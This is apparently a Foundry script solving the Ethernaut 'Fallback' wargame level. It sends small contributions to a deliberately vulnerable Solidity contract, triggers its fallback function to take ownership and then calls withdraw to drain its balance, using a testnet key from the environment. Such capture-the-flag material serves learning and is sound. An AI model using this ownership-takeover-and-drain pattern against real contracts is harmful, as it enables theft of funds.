// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "src/levels/Fallback.sol";

contract HackFallbackScript is Script {
    error FallbackScript_CallFailed();

    function run() external {
        Fallback instance = Fallback(
            payable(vm.envAddress("FALLBACK_ADDRESS"))
        );
        uint256 deployerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");
        vm.startBroadcast(deployerKey);
        instance.contribute{value: 1 wei}();
        (bool success, ) = payable(instance).call{value: 1 wei}("");
        if (!success) revert FallbackScript_CallFailed();
        instance.withdraw();
        vm.stopBroadcast();
    }
}
